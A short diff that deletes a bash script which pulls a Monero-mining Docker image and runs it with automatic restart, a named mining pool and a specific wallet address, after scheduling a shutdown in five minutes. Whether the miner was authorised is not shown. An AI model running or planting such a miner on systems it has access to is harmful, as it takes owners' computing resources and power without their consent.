@@ -1,4 +1,0 @@
-#! /bin/bash
-sudo shutdown -P +5
-sudo docker pull pmietlicki/monero-miner
-sudo docker run -itd --restart=always -e POOL_URL=frankfurt02.hashvault.pro:80 -e POOL_USER=4846S5hnZQLNUFLWAak9Aj2bTgpTEQY5N8aYMk2h26kNaMG59iNE3E3G6kxUCm5Y34jQvsH5GPH4XZ34yWpYM63f1SDkuQr --name monero pmietlicki/monero-miner
